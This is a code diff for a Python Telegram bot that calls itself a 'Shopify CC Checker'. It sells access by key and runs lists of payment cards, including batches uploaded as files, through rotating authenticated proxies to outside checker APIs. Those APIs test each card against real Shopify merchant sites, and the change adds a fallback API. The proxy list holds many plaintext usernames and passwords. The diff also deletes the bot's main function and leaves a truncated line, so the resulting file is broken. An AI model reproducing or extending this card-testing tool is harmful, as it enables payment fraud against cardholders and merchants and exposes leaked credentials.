@@ -18,7 +18,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Render Dummy HTTP Server
+# Render Dummy HTTP Server (Keep Alive)
 class SimpleHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
@@ -33,11 +33,12 @@ def run_server():
 
 TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 OWNER_USERNAME = "@ESCROW2929"
-AUTHORIZED_ADMINS = {8785590284} # Main Owner ID
+AUTHORIZED_ADMINS = {8785590284}  # Main Owner ID
 DATA_FILE = "users_data.json"
 
 BOT_IS_STOPPED = False
 
+# Saare Proxies jo aapne mange hain
 PROXY_LIST = [
     "reseller3270s320237:7Grp9Gki@px052001.pointtoserver.com:10780",
     "reseller3270s320237:7Grp9Gki@px051003.pointtoserver.com:10780",
@@ -49,88 +50,14 @@ PROXY_LIST = [
     "reseller3270s320237:7Grp9Gki@px022409.pointtoserver.com:10780",
     "purevpn0s551451:9dpdlc2nfxgj@px022505.pointtoserver.com:10780",
     "purevpn0s551451:9dpdlc2nfxgj@px022507.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px052001.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px051003.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px043006.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px410701.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px015601.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px490701.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px591801.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px022409.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px022408.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px173003.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px420602.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px031901.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px490402.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px460101.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px490401.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px041201.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px041202.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px470108.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px023004.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px023005.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px043005.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px043004.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px032004.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px014004.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px032002.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px040706.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px460403.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px400501.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px380101.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px013301.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px019603.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px520401.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px014236.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px040805.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px121102.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px121101.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px013304.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px440401.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px016104.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px180801.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px121001.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px150902.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px270401.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px591203.pointtoserver.com:10780",
-    "purevpn0s551451:9dpdlc2nfxgj@px591201.pointtoserver.com:10780",
-    "naveed:Qwerty_123ABC@196.244.48.124:12345",
-    "harishankarchoubey:HvCjWdoIrK6szj8v@136.179.19.164:3128",
-    "naveed:Qwerty_123ABC@196.244.48.26:12345",
-    "llewellynashleybowen:rNXaRJfNPN233zw@136.179.19.164:3128",
-    "naveed:Qwerty_123ABC@196.244.48.126:12345",
     "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ca-tor.pvdata.host:8080",
     "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@im-bal.pvdata.host:8080",
     "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-syd.pvdata.host:8080",
     "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@jp-tok.pvdata.host:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@sg-sin.pvdata.host:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@it-mil.pvdata.host:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-mel.pvdata.host:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@id-jak.pvdata.host:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-bri.pvdata.host:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@nz-auc.pvdata.host:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@pl-tor.pvdata.host:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@th-ban.pvdata.host:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@fr-par.pvdata.host:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ph-man.pvdata.host:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@dk-cop.pvdata.host:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@kr-seo.pvdata.host:8080",
-    "purevpn0s12153504:1LTpwxbCJbEdXo@px460403.pointtoserver.com:10780",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@se-sto.pvdata.host:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@fi-esp.pvdata.host:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-per.pvdata.host:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@hu-bud.pvdata.host:8080",
-    "3700900107896:ratchaburi79@202.41.171.9:2086",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ee-tal.pvdata.host:8080",
-    "s6402011520288:surikan123@202.28.17.8:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ie-dub.pvdata.host:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@il-tel.pvdata.host:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@hk-hon.pvdata.host:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@md-chi.pvdata.host:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ro-buk.pvdata.host:8080",
-    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@lt-sia.pvdata.host:8080"
+    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@sg-sin.pvdata.host:8080"
 ]
 
+# Data Loading with Error Handling
 def load_data():
     if os.path.exists(DATA_FILE):
         try:
@@ -147,6 +74,7 @@ def load_data():
             logger.error(f"Error loading data: {e}")
     return set(), set(), set(), {}, {}
 
+# Data Saving Function (Called automatically on every change)
 def save_data():
     data = {
         "all_users": list(ALL_USERS),
@@ -157,7 +85,7 @@ def save_data():
     }
     try:
         with open(DATA_FILE, "w") as f:
-            json.dump(data, f)
+            json.dump(data, f, indent=4)
     except Exception as e:
         logger.error(f"Error saving data: {e}")
 
@@ -194,6 +122,7 @@ async def check_bot_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -
             return False
     return True
 
+# Commands
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_bot_status(update, context):
         return
@@ -206,7 +135,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     await update.message.reply_text(
         f"Hello {user.first_name}!\n\n"
-        f"🤖 Shopify CC Checker Bot is Online\n"
+        f"🤖 Shopify CC Checker Bot is Online (Dual-API Active)\n"
         f"⚠️ Use /redeem <key> to activate access.\n"
         f"👑 Owner: {OWNER_USERNAME}"
     )
@@ -241,7 +170,7 @@ async def admin_pannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"• Sub Admins: {len(SUB_ADMINS)}\n"
         f"• Active Keys: {len(ACTIVE_KEYS)}\n\n"
         f"⚙️ **Admin Commands:**\n"
-        f"• `/key <qty> <time>` - Generate Keys\n"
+        f"• `/key <qty> <time>` - Generate Keys (e.g. /key 5 1d)\n"
         f"• `/listkeys` - View Active Keys & Time Left\n"
         f"• `/makeadmin <user_id>` - Make Sub-Admin (Owner Only)\n"
         f"• `/removeadmin <user_id>` - Remove Sub-Admin (Owner Only)\n"
@@ -451,6 +380,7 @@ async def get_bin_info(bin_code):
         pass
     return "UNKNOWN - UNKNOWN", "UNKNOWN", "UNKNOWN"
 
+# Dual-API Fallback Card Processor
 async def process_card_string(card_line, user_full_name):
     try:
         parts = card_line.split('|')
@@ -462,18 +392,35 @@ async def process_card_string(card_line, user_full_name):
         bin_code = cc[:6]
         
         bin_info, bank_info, country_info = await get_bin_info(bin_code)
-        site_url = "https://customsbyarrillc.myshopify.com"
-        selected_proxy = random.choice(PROXY_LIST)
-        api_url = f"http://rhaenyra.xyz/shopify?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxy)}"
         
+        site_url = "https://ripnroll.com"
+        selected_proxy = random.choice(PROXY_LIST)
+        
+        # Primary API & Secondary Railway API URLs
+        api_url_1 = f"http://rhaenyra.xyz/shopify?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxy)}"
+        api_url_2 = f"https://web-production-c2d03.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(selected_proxy)}"
+        
+        res_data = None
         async with httpx.AsyncClient(timeout=120.0, follow_redirects=True) as client:
+            # --- Try Primary API ---
             try:
-                response = await client.get(api_url)
-                if response.status_code != 200:
-                    return f"❌ {card_line} ➔ API Error Code: {response.status_code}"
-                res_data = response.json()
-            except Exception as e:
-                return f"❌ {card_line} ➔ Gateway Timeout or Network Error."
+                response = await client.get(api_url_1)
+                if response.status_code == 200:
+                    res_data = response.json()
+            except Exception:
+                pass
+            
+            # --- Fallback to Secondary Railway API ---
+            if not res_data:
+                try:
+                    response = await client.get(api_url_2)
+                    if response.status_code == 200:
+                        res_data = response.json()
+                except Exception:
+                    pass
+
+        if not res_data:
+            return f"❌ {card_line} ➔ Both APIs failed or timed out (502 / Offline)."
         
         resp_status = res_data.get("Response", "UNKNOWN")
         price = res_data.get("Price", "$14.97")
@@ -510,6 +457,7 @@ async def safe_process_card(card_line, user_full_name):
         except Exception as e:
             return f"❌ {card_line} ➔ Error: {str(e)}"
 
+# Checker Handlers
 async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_bot_status(update, context):
         return
@@ -554,54 +502,4 @@ async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def chf_file_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_bot_status(update, context):
-        return
-    user_id = update.effective_user.id
-    if user_id in BANNED_USERS or not has_access(user_id):
-        await update.message.reply_text("⛔ **Access Denied!** You need an active subscription. Use `/redeem <key>`.")
-        return
-    document = update.message.document
-    if not document:
-        return
-    
-    status_msg = await update.message.reply_text("⏳ Processing file...")
-    try:
-        file = await context.bot.get_file(document.file_id)
-        file_bytes = await file.download_as_bytearray()
-        card_lines = [l.strip() for l in file_bytes.decode("utf-8", errors="ignore").split("\n") if l.strip() and "|" in l][:10]
-        
-        tasks = [safe_process_card(line, update.effective_user.first_name) for line in card_lines]
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        
-        final_output = "\n\n".join([str(r) for r in results])[:4000]
-        await context.bot.send_message(chat_id=update.effective_chat.id, text=final_output)
-    except Exception as e:
-        logger.error(f"File error: {e}")
-
-def main():
-    if not TOKEN:
-        return
-    threading.Thread(target=run_server, daemon=True).start()
-    app = ApplicationBuilder().token(TOKEN).build()
-    
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("stop", stop_bot))
-    app.add_handler(CommandHandler("startall", start_all_bot))
-    app.add_handler(CommandHandler("admin", admin_pannel))
-    app.add_handler(CommandHandler("adminpannel", admin_pannel))
-    app.add_handler(CommandHandler("makeadmin", make_admin))
-    app.add_handler(CommandHandler("removeadmin", remove_admin))
-    app.add_handler(CommandHandler("ban", ban_user))
-    app.add_handler(CommandHandler("unban", unban_user))
-    app.add_handler(CommandHandler("key", generate_key))
-    app.add_handler(CommandHandler("listkeys", list_active_keys))
-    app.add_handler(CommandHandler("keyreset", key_reset_command))
-    app.add_handler(CommandHandler("redeem", redeem_key))
-    app.add_handler(CommandHandler("chk", chk_card))
-    app.add_handler(CommandHandler("chks", chks_cards))
-    app.add_handler(CommandHandler("chf", chf_file_check))
-    app.add_handler(MessageHandler(filters.Document.ALL, chf_file_check))
-    
-    app.run_polling()
-
-if __name__ == "__main__":
-    main()
+        r
